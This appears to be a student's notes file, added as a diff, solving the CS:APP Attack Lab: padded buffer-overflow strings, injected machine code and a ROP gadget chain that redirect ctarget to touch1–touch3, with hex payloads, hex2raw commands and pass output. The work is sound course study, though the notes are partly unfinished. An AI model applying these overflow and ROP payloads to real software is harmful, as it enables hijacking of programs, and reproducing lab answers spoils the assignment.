@@ -1,0 +1,268 @@
+Introduction
+   I was not able to run the ctarget program on Ubuntu or on the Windows WSL.
+
+   Researching a bit I found this: https://stackoverflow.com/questions/77568098/csapp-attack-lab-phase1-segmentation-fault-on-ubuntu22-04
+
+   So I installed:
+   1. Virtual Box
+   2. Fedora 39
+   3. Vim
+   4. Gcc
+
+   Then I was able to run the program.
+
+   I installed WSL2 on Windows and then Debian. It didn't work with Ubuntu.
+
+
+Target 1:
+   The goal of the first target is to have a string input that causes the program to execute function touch1() instead of running the regular flow.
+
+   To accomplish that I must manage to insert a string big enough so I can have the address of the target function stored at the place where the return address is stored.
+
+   I need to know the amount of space I have between the top of the stack and the place where the return address is stored.
+
+   The address of the returning function is 0x4017c0. I may need to change the order from 40 17 c0 to c0 17 40.
+
+   I put a break in the getbuf function. I noticed that the stack pointer is being subtracted by 0x28 (40 decimal, this is the actual amount of space). I think I need to provide a 40 bytes string in which the last six bytes are an address: 0x000000c01740.
+
+   With a total of 40 bytes, I need to build a file which has 40 bytes in which the last bytes correspond to the address of touch 1. The last part should be: c0 17 40 00 00 00 00 00
+
+   The previous part of the file should be all zeros (32 in total).
+
+   Answer:
+
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00 /* padding with 40 bytes */
+      c0 17 40 00 00 00 00 00
+
+   The sequence of commands that we must run is: cat exploit.txt | ./hex2raw | ./ctarget -q
+
+   We get:
+
+      liveuser@localhost-live:~/Documents/target1$ cat exploit.txt | ./hex2raw | ./ctarget -q
+      Cookie: 0x59b997fa
+      Type string:Touch1!: You called touch1()
+      Valid solution for level 1 with target ctarget
+      PASS: Would have posted the following:
+      user idbovik
+      course15213-f15
+      labattacklab
+      result1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 00 00
+
+   This video helped me with the order of the last bytes: www.youtube.com/watch?v=UjplAYHHg5A
+
+Target 2:
+   Now we must call the function touch2 with a parameter. The value of the parameter must be our cookie word, in my case 0x59b997fa. The value of this parameter is passed via %rdi. So the challenge is to load the cookie value in the %rdi register and then call function touch2.
+
+   The first step is to discover what hexadecimal code represents mov 0x59b997fa, %rdi. To do just that we create a file called level2.s, compile it with gcc -c level2.s, we obtain level2.o.
+
+   Now we need to dump this object with objdump -d level2.o > level2.s. This is the disassembly code with the code instructions. I got: 48 c7 c7 fa 97 b9 59
+
+   Now let's combine this with the address of touch2, which is ec 17 40 00 00 00 00 00 00 00 00
+
+   In my first attempt I place the code at the beginning of the file and called: cat level2.txt | ./hex2raw | ./ctarget -q
+
+   My first attempt was to include the sequence of byte codes for the mov instruction into the into the sequence of characters.
+
+      /* Padding of 40 bytes (28 in hex) */
+      48 c7 c7 fa 97 b9 59 00 00 00
+      00 00 00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00 00 00
+      /* touch2 address */
+      ec 17 40 00 00 00 00 00 00 00
+
+   I've tried to move the values around, but it didn't work.
+
+
+   Now I'll try to have the code below in the sequence of instructions:
+
+      
+   => 0x00000000004017b4 <+12>:mov    $0x1,%eax
+   rsp: 0x5561dc78
+
+      68 ec 17 40 00             /* push address of return (target2)  */
+      48 c7 c7 fa 97 b9 59       /* mov cookie to %rdi      */
+      c3                         /* return                  */
+      00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00    /* up here, padding of 40 bytes, 28 in hex */
+      78 dc 61 55 00 00 00 00    /* address of stack pointer */
+
+
+   level2.o:     file format elf64-x86-64
+
+
+   Disassembly of section .text:
+
+   0000000000000000 <.text>:
+      0:   68 ec 17 40 00          push   $0x4017ec
+      5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+      c:   c3
+
+Target 3:
+
+   Now the challenge is to build a string in which the cookie is represented as ascii code, and then use the knowledge of the stack pointer to point it to this string. The pointer should point to this part of the file.
+
+   We need to provide a string in which we overload the register rdi to have the address of our string. We then need to provide our string in ascii representation. And, finally, we must call the address of touch3.
+
+   $rsp value:
+   ----------
+   rsp before entering getbuf: 0x5561dca0
+   rsp after entering getbuf: 0x5561dc78
+   rsp right before exiting getbuf: 0x5561dca0
+
+   String representation:
+   ---------------------
+   0x59b997fa
+   hex35 39 62 39 39 37 66 61 5C 6E
+    5  9  c  9  9  7  f  a  \ n
+   dec 53 57 99 57 57 55 102 97 92 110
+
+   Now we must decide which sequence of codes to use. One possible sequence would be:
+   a)
+   1. push target3 address to the stack
+   2. move the string address to the stack
+   3. return, so the next instruction pops target3's address
+   4. place the string parameter
+   5. set the overall return to the instruction after Gets
+
+   b)
+   1. push target3 address to the stack
+   2. place the string parameter
+   3. set the overall return to target3
+
+
+   level3.o:     file format elf64-x86-64
+
+
+   Disassembly of section .text:
+
+   0000000000000000 <.text>:
+      0:   68 fa 18 40 00          push   $0x4018fa
+      5:   48 c7 c7 6b dc 61 55    mov    $0x5561dc78,%rdi /* 0x5561DC6B */
+      c:   c3                      ret
+
+
+
+   This was my first attempt:
+
+      68 fa 18 40 00             /* push $0x4018fa  */
+      48 c7 c7 6b dc 61 55       /* mov $0x5561dc6b, %rdi */ /* stack pointer - 13 */
+      c3                         /* ret */
+      35 39 62 39 39 37 66 61    /* 59b997fa\n in Ascii */
+      a0
+      00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      78 dc 61 55 00 00 00 00
+
+
+   This was my second attempt:
+
+      68 fa 18 40 00             /* push $0x4018fa (touch3) */
+      48 c7 c7 a8 dc 61 55       /* mov $0x5561dcXX, %rdi */ /* initial stack pointer + 0x8 */
+      c3                         /* ret */
+      00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00    /* padding up to 40 bytes */
+      78 dc 61 55 00 00 00 00    /* stack pointer after Gets */
+      35 39 62 39 39 37 66 61    /* 59b997fa in Ascii, cookie */
+      00 00 00 00 00 00 00 00    /* NULL terminator */
+
+   After investigating more, I realized that the cookie should be the
+   last piece of information, so it would not get the risk of being erased. So the file must have:
+   1. The address of touch 3 should be pushed to the stack.
+   2. Register rdi must be overwritten with a memory address containing the cookie.
+   3. The ret instruction should be called so we get to touch3.
+   4. We should pad to 40 bytes.
+   5. We should have here the address of return of the stack pointer.
+   6. The cookie should be entered here, in the end of the stack, which is the higher address + 0x8.
+
+   Recall that the higher address is the address of the stack pointer before we entered the getbuf function.
+
+   https://hackmd.io/@Chang-Chia-Chi/H1Z8o7QlK
+
+
+Target 4:
+   We are to repeat the attack of phase 2. Set rdi to our cookie and call touch2.
+
+   So, we need to push touch2 address to the stack. Set rdi to have our cookie. Return the function. Place the return stack pointer to the address after the call to Gets.
+
+   movq instructions have format 48 89 xx
+   popq instructions have format 5x
+   movl instructions have format 89 xx
+   ret C3
+
+   nop instructions can be:
+   andb 20 xx
+   orb 08 xx
+   cmpb 38 xx
+   testb 84 xx
+
+   GOAL
+
+   68 ec 17 40 00             /* push address of return (target2)  */
+   48 c7 c7 fa 97 b9 59       /* mov cookie to %rdi      */
+   c3                         /* return                  */
+   00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00
+   00 00 00 00 00 00 00 00    /* up here, padding of 40 bytes, 28 in hex */
+   78 dc 61 55 00 00 00 00    /* address of stack pointer */
+
+
+   Procurando 48 c7 c0 fa 97 b9 59
+   linha  
+   linha 924: 48 89 c7 c3  --> mov %rax, %rdi e ret --> address: 0x4019a2
+   linha 936: 58 --> pop rax --> address: 4019ab
+
+   When a string is passed, the values are stored at the top of the stack. The first lines will seat at the top of the stack. So first we fill up the stack with zeros.
+
+   Then we place the structions in order of execution.
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      ab 19 40 00 00 00 00 00   /* popq %rax -> stores next line in rax */
+      fa 97 b9 59 00 00 00 00   /* cookie */
+      a2 19 40 00 00 00 00 00   /* mov %rax, %rdi */
+      ec 17 40 00 00 00 00 00   /* touch2 -> this is called by the ret from Gets */
+
+
+   Since the characters are placed in order we get a stack like this:
+
+   This is the stack:
+
+      00 00 00 00 00 40 17 ec  --> touch2
+      00 00 00 00 00 40 19 a2  --> mov %rax, %rdi; ret
+      00 00 00 00 59 b9 97 fa  --> cookie
+      00 00 00 00 00 40 19 ab  --> pop %rax; ret
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00
+      00 00 00 00 00 00 00 00 -> Top of the stack
+
+
+   The execution is from the top of the stack (lower addresses) to the bottom of the stack (higher adresses). So first we pop from the stack, the value of the pop is cookie, then we move this value to rdi, and then the function getbuf calls ret which pops the address of touch2.
+
+   A mecânica é a seguinte. Temos essa string enorme que vamos passar para a função Gets. Ela vai chamar ret e retornar para o endereço no topo do stack frame, nesse caso, o endereço da instrução pop %rax. 
+
+   A instrução termina com ret e é direcionada para o endereço de
+
+   Essa instrução decrementa pega esse valor colocando-o em %rax e decrementa a stack. Temos portanto o cookie no registro rax.
+
+   Agora executamos a função mov e depois retornamos para touch2.
+
+   Dúvida: O que parece é que do ponto de vista de pop q, o topo da stack é cookie. Será isso mesmo?
+   
+
+
+
+
